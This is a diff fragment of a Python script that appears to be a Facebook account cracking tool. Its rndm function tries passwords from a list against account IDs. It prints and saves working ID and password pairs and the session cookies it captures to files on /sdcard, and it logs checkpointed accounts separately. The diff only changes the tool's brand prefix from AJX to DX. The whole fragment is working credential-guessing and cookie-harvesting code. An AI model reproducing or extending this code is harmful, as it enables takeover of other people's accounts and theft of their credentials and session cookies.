@@ -2179,11 +2178,11 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [AJX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [DX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/AJX-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/AJX-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/DX-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/DX-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -2193,8 +2192,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;208m [AJX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AJX-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [DX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/DX-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
